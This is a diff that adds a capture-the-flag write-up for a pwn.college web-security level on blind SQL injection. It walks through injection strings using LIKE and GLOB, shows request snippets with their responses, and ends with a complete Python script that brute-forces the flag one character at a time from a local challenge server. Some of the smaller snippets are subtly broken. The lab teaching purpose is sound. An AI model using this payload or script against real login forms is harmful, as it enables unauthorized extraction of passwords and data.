@@ -439,7 +439,7 @@ In [48]: import requests as rq
 ```
 
 
-## Web-Security level 
+## Web-Security level 7
 
 * Exploit a structured query language injection vulnerability to blindly leak data
 
@@ -472,13 +472,174 @@ def level7():
     return form(["username", "password"])
 ```
 
-> Query that we use.
+* In the above query there is `rowid` used which we don't know..
+* also there is multiple item in `SELECT` query.
+* `assert` used in this `POST` login method, which means if we login successfully `assert` will not executes otherwise assert will executes.
+* In bottom of lines we can see that there is a message where it show `"Hello {username}"` mean, if we successfully login then it will be showed.
+* This is a type of blind SQL where we don't know the response, In this case we can still exploit the database by using conditional statement by extracting bit by bit data.
+* So, Conclusion is : we can guess the user password by login error type :
+  * if our passed `character` is match correct in database password, that means we guess the correct character.
+  * Otherwise if it's wrong then we can say it's not correct.
+  * We will have to extract data by bit by bit.
+
+> Query that we use :
+
 ```sql
+-- Original query
+SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"
+
+
+-- in form username & password we can use OR SQl query which will executes:
+SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"
+                                               ^^^^^^^^
+                                                " OR password LIKE "p%" -- -
+-- this will result the output that starts with "p" 
 
 ```
+
+* Example : This script where we use the `LIKE` `"a%"` means, it will match the password letter that start with `a`. But, it results error because it's not matched.
+```py
+import requests as rq
+import string
+
+url = "http://challenge.localhost:80"
+
+searchspace = string.ascii_letters + string.digits + '{}_.-'
+
+data = {
+    'username': 'flag " OR password  LIKE "a%" -- -',
+    'password': 'pass'
+    }
+response = s.post(url, data=data )
+print(response, "\n", response.text)
+```
+
+> result : It's not matches with password, resulting error.
+
+```palin
+<Response [400]> 
+ Invalid `username` or `password`
+```
+
+* Now This time we will use the match case : 
+
+* Example : This script where we use the `LIKE` `"p%"` means, it will match the password letter that start with `a`. The result is `Hello` because it's matched.
+```py
+import requests as rq
+import string
+
+url = "http://challenge.localhost:80"
+
+searchspace = string.ascii_letters + string.digits + '{}_.-'
+
+data = {
+    'username': 'flag " OR password  LIKE "p%" -- -',
+    'password': 'pass'
+    }
+response = s.post(url, data=data )
+print(response, "\n", response.text)
+```
+
+> result : This time it matches with the password.
+```plain
+<Response [200]> 
+ Hello, flag!
+```
+
+* There is problem with `LIKE` i.e `case insensitive`. We can use the `GLOB` instead of `LIKE` that work similar and solve the case insensitive problem.
+  
+> GLOB instead of LIKE clause.
+```sql
+-- Original query
+SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"
+
+-- Using the LIKE not work with case insensitive, So instead of LIKE we use GLOB clause which will work.
+SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"
+                                                ^^^^^^^
+                                                " OR password GLOB "p*" -- -
+--  In GLOB we use (*) astrict.
+```
+
+* After few minutes, we guess some characters : `pwn.college{QIYl7ae`
 
 ```py
+import requests as rq
+import string
 
+url = "http://challenge.localhost:80"
+
+searchspace = string.ascii_letters + string.digits + '{}_.-'
+
+data = {
+    'username': 'flag " OR password GLOB "pwn.college{QIYl7ae*" -- -',
+    'password': 'pass'
+    }
+response = s.post(url, data=data )
+print(response, "\n", response.text)
 ```
+> Result 
+```plain
+<Response [200]> 
+ Hello, flag
+```
+
+* This process where we manually extracting bit by bit data is long and time-taken, instead of that we can automate this process by scripting.
+* We can make python script that will match the password.
+* This script will find the flag.
+
+```py
+# this module help us to interact with http request.
+import requests
+# this module will help us to bruteforce.
+import string
+
+# establishing session
+s = requests.Session()
+
+# Target url :
+url = "http://challenge.localhost:80"
+
+# Possible character for bruteforce
+searchspace = string.ascii_letters + string.digits + '{}_.-'
+
+# match case to break loop.
+end = "}"
+
+# Solution store in this variable
+solution = ''
+
+# 1st loop break when match case found.
+while end:
+    # second loop for finding the values.
+    for c in searchspace:
+
+        # here we use GLOB instead of LIKE because there is case insensitive problem occur.
+        data = {
+            'username': f'" OR password  GLOB "{solution}{c}*" -- -',
+            'password': 'pass'
+            }
+        # the request parameter.
+        response = s.post(url, data=data )
+        
+        # Match case for correct found character
+        if response.text.startswith("Hello"):
+            solution += c
+            print(c)
+            print(solution)
+            break
+
+    # match case to break loop
+    if end  == c:
+        break
+
+print("\n\n\t", "Falg is : ", solution)
+```
+> result 
+```palin
+    Flag is : pwn.college{flag_here}
+```
+
+
+## Web-Security Level 8
 
 
